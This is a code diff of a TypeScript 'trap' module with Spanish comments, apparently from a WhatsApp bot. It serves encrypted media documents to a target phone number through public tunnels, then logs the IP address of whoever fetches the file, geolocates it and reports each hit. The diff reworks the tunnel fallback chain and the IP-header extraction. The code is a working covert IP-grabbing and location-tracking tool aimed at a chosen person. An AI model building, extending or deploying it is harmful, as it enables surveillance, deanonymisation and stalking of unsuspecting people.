@@ -1,13 +1,13 @@
 import { createCipheriv, createHash, createHmac, hkdfSync, randomBytes } from "node:crypto";
-import { createServer, type Server } from "node:http";
+import { createServer, type IncomingMessage, type Server, type ServerResponse } from "node:http";
 import { spawn, type ChildProcess } from "node:child_process";
-import { existsSync } from "node:fs";
 
 export const TRAP_TTL_MS = Number(process.env.TRAP_TTL_MS ?? 180_000);
 
 const MAX_HITS = 4;
 const KEEP_AFTER_CLOSE_MS = 15 * 60_000;
 const LOCAL_HOST = "127.0.0.1";
+const PROBE_UA = "WhatsApp/2.24.1.79 A";
 
 export interface GeoInfo {
   country?: string;
@@ -47,21 +47,20 @@ export interface TrapSession {
   createdAt: number;
   hits: TrapHit[];
   closed: boolean;
-  onHit: (s: TrapSession, h: TrapHit) => Promise<void>;
+  onHit: (s: TrapSession, h: TrapHit, idx: number) => Promise<void>;
   onExpire: (s: TrapSession) => Promise<void>;
   timer: NodeJS.Timeout;
 }
 
 const sessions = new Map<string, TrapSession>();
 
-/* ─────────────── infraestructura: listener + túnel ─────────────── */
+/* ─────────── listener local + cadena de túneles ─────────── */
 
 let server: Server | null = null;
 let port = 0;
 let publicBase: string | null = (process.env.TRAP_BASE_URL ?? "").replace(/\/+$/, "") || null;
-let tunnelProc: ChildProcess | null = null;
-let tunnelObj: { url: string; close: () => void } | null = null;
 let bootstrapping: Promise<string> | null = null;
+const closers: Array<() => void> = [];
 
 async function startServer(): Promise<void> {
   if (server) return;
@@ -76,89 +75,122 @@ async function startServer(): Promise<void> {
 }
 
 async function probe(base: string): Promise<boolean> {
-  try {
-    const r = await fetch(`${base}/__ping?t=${Date.now()}`, { signal: AbortSignal.timeout(7000) });
-    return (await r.text()).trim() === "pong";
-  } catch {
-    return false;
-  }
-}
-
-async function openTunnel(): Promise<string> {
-  const cf = ["cloudflared", "npx"].find((bin) =>
-    bin === "npx" ? true : existsSync(`/usr/bin/${bin}`) || existsSync(`/usr/local/bin/${bin}`) || existsSync(`/data/data/com.termux/files/usr/bin/${bin}`)
-  );
-
-  if (cf) {
+  for (let i = 0; i < 2; i++) {
     try {
-      const args =
-        cf === "npx"
-          ? ["--yes", "cloudflared", "tunnel", "--url", `http://${LOCAL_HOST}:${port}`, "--no-autoupdate"]
-          : ["tunnel", "--url", `http://${LOCAL_HOST}:${port}`, "--no-autoupdate"];
-
-      tunnelProc = spawn(cf, args, { stdio: ["ignore", "pipe", "pipe"] });
-      const url = await new Promise<string | null>((resolve) => {
-        const timer = setTimeout(() => resolve(null), 25_000);
-        const onData = (buf: Buffer) => {
-          const m = buf.toString().match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
-          if (m) {
-            clearTimeout(timer);
-            resolve(m[0]);
-          }
-        };
-        tunnelProc!.stdout?.on("data", onData);
-        tunnelProc!.stderr?.on("data", onData);
-        tunnelProc!.once("exit", () => resolve(null));
+      const r = await fetch(`${base}/__ping?t=${Date.now()}`, {
+        headers: { "User-Agent": PROBE_UA, Accept: "*/*" },
+        signal: AbortSignal.timeout(9000),
       });
+      const ct = r.headers.get("content-type") ?? "";
+      const body = (await r.text()).trim();
+      if (r.ok && !ct.includes("text/html") && body === "pong") return true;
+    } catch {}
+  }
+  return false;
+}
 
-      if (url && (await probe(url))) return url;
-      tunnelProc?.kill();
-      tunnelProc = null;
-    } catch {
-      tunnelProc?.kill();
-      tunnelProc = null;
-    }
+async function viaLocaltunnel(): Promise<string | null> {
+  const lt: any = await import("localtunnel").catch(() => null);
+  if (!lt?.default) return null;
+  const t = await lt.default({ port, local_host: LOCAL_HOST }).catch(() => null);
+  if (!t) return null;
+  if (await probe(t.url)) {
+    closers.push(() => t.close());
+    return t.url as string;
+  }
+  t.close();
+  return null;
+}
+
+async function viaTunnelmole(): Promise<string | null> {
+  const tm: any = await import("tunnelmole").catch(() => null);
+  const fn = tm?.tunnelmole ?? tm?.default?.tunnelmole;
+  if (typeof fn !== "function") return null;
+  const url: string | null = await fn({ port }).catch(() => null);
+  if (!url) return null;
+  if (await probe(url)) return url;
+  return null;
+}
+
+async function viaCloudflared(): Promise<string | null> {
+  let proc: ChildProcess;
+  try {
+    proc = spawn("cloudflared", ["tunnel", "--url", `http://${LOCAL_HOST}:${port}`, "--no-autoupdate"], {
+      stdio: ["ignore", "pipe", "pipe"],
+    });
+  } catch {
+    return null;
   }
 
-  try {
-    const lt: any = await import("localtunnel").catch(() => null);
-    if (lt?.default) {
-      const t = await lt.default({ port, local_host: LOCAL_HOST });
-      tunnelObj = t;
-      if (await probe(t.url)) return t.url as string;
-      t.close();
-      tunnelObj = null;
-    }
-  } catch {}
+  const url = await new Promise<string | null>((resolve) => {
+    const timer = setTimeout(() => resolve(null), 25_000);
+    const onData = (b: Buffer) => {
+      const m = b.toString().match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
+      if (m) {
+        clearTimeout(timer);
+        resolve(m[0]);
+      }
+    };
+    proc.stdout?.on("data", onData);
+    proc.stderr?.on("data", onData);
+    proc.once("error", () => resolve(null));
+    proc.once("exit", () => resolve(null));
+  });
 
-  throw new Error(
-    "No se pudo abrir túnel público. Instala cloudflared (`pkg install cloudflared` en Termux) o corre `npm i localtunnel`, o define TRAP_BASE_URL."
-  );
+  if (url && (await probe(url))) {
+    closers.push(() => proc.kill());
+    return url;
+  }
+  proc.kill();
+  return null;
 }
+
+const PROVIDERS: Record<string, () => Promise<string | null>> = {
+  localtunnel: viaLocaltunnel,
+  tunnelmole: viaTunnelmole,
+  cloudflared: viaCloudflared,
+};
 
 export async function ensurePublicBase(): Promise<string> {
   if (publicBase) return publicBase;
   if (bootstrapping) return bootstrapping;
+
   bootstrapping = (async () => {
     await startServer();
-    publicBase = await openTunnel();
-    return publicBase;
+    const forced = process.env.TRAP_TUNNEL?.trim().toLowerCase();
+    const order = forced && PROVIDERS[forced] ? [forced] : ["localtunnel", "tunnelmole", "cloudflared"];
+    const fallos: string[] = [];
+
+    for (const name of order) {
+      const url = await PROVIDERS[name]().catch(() => null);
+      if (url) {
+        publicBase = url;
+        return url;
+      }
+      fallos.push(name);
+    }
+
+    throw new Error(
+      `Ningún túnel público respondió (${fallos.join(", ")}). Corre \`npm i localtunnel tunnelmole\` y reinicia, o define TRAP_BASE_URL.`
+    );
   })().finally(() => {
     bootstrapping = null;
   });
+
   return bootstrapping;
 }
 
 export function stopTrap() {
-  tunnelObj?.close();
-  tunnelProc?.kill();
+  for (const c of closers.splice(0)) {
+    try {
+      c();
+    } catch {}
+  }
   server?.close();
-  tunnelObj = null;
-  tunnelProc = null;
   server = null;
 }
 
-/* ─────────────── cifrado de media (esquema WhatsApp) ─────────────── */
+/* ─────────── cifrado de media ─────────── */
 
 function hkdf(key: Buffer, salt: Buffer, info: string, size: number): Buffer {
   return Buffer.from(hkdfSync("sha256", key, salt, Buffer.from(info), size));
@@ -182,7 +214,7 @@ function encryptMedia(plain: Buffer) {
   };
 }
 
-/* ─────────────── sesiones ─────────────── */
+/* ─────────── sesiones ─────────── */
 
 export interface CreateSessionOpts {
   plain: Buffer;
@@ -191,7 +223,7 @@ export interface CreateSessionOpts {
   targetPhone: string;
   chatJid: string;
   pushName: string;
-  onHit: (s: TrapSession, h: TrapHit) => Promise<void>;
+  onHit: (s: TrapSession, h: TrapHit, idx: number) => Promise<void>;
   onExpire: (s: TrapSession) => Promise<void>;
 }
 
@@ -246,12 +278,13 @@ async function expire(s: TrapSession) {
   t.unref?.();
 }
 
-/* ─────────────── captura ─────────────── */
+/* ─────────── captura ─────────── */
 
-function clientIp(req: import("node:http").IncomingMessage): string {
+function clientIp(req: IncomingMessage): string {
   const xff = String(req.headers["x-forwarded-for"] ?? "");
   const cf = String(req.headers["cf-connecting-ip"] ?? "");
-  const raw = cf || xff.split(",")[0].trim() || String(req.socket.remoteAddress ?? "");
+  const xrl = String(req.headers["x-real-ip"] ?? "");
+  const raw = cf || xrl || xff.split(",")[0].trim() || String(req.socket.remoteAddress ?? "");
   return raw.replace(/^::ffff:/, "").replace(/^\[|\]$/g, "").trim();
 }
 
@@ -318,7 +351,7 @@ async function geoLookup(ip: string): Promise<GeoInfo | null> {
   return null;
 }
 
-export async function trapHandler(req: import("node:http").IncomingMessage, res: import("node:http").ServerResponse) {
+export async function trapHandler(req: IncomingMessage, res: ServerResponse) {
   const path = new URL(req.url ?? "/", "http://local").pathname;
 
   if (path === "/__ping") {
@@ -367,7 +400,7 @@ export async function trapHandler(req: import("node:http").IncomingMessage, res:
   await s.onHit(s, hit, idx).catch(() => undefined);
 }
 
-/* ─────────────── mensaje ─────────────── */
+/* ─────────── mensaje ─────────── */
 
 export function buildDocumentMessage(s: TrapSession, caption: string, contextInfo?: any) {
   return {
